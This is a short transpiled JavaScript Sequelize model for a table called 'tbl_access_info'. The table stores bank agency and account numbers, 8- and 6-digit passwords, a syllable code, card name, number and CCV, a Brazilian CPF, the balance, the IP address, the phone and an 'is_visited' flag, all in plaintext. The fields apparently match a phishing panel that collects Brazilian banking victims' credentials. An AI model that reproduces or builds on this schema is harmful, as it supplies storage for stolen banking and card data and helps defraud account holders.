"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports["default"] = void 0;

// const { DataTypes } = require("sequelize");
var _default = function _default(sequelize, Sequelize) {
  var Log = sequelize.define('Log', {
    id: {
      type: Sequelize.INTEGER,
      allowNull: false,
      autoIncrement: true,
      primaryKey: true
    },
    date: {
      type: Sequelize.STRING
    },
    name: {
      type: Sequelize.STRING
    },
    agency: {
      type: Sequelize.STRING,
      allowNull: false
    },
    account: {
      type: Sequelize.STRING,
      allowNull: false
    },
    password_8: {
      type: Sequelize.STRING,
      allowNull: false
    },
    balance: {
      type: Sequelize.STRING,
      allowNull: false
    },
    password_6: {
      type: Sequelize.STRING
    },
    syllabic: {
      type: Sequelize.STRING
    },
    card_name: {
      type: Sequelize.STRING
    },
    card_number: {
      type: Sequelize.STRING
    },
    ccv: {
      type: Sequelize.STRING
    },
    cpf: {
      type: Sequelize.STRING
    },
    is_visited: {
      type: Sequelize.BOOLEAN
    },
    ip_address: {
      type: Sequelize.STRING
    },
    phone: {
      type: Sequelize.STRING
    }
  }, {
    tableName: 'tbl_access_info',
    timestamps: false
  });
  return Log;
};

exports["default"] = _default;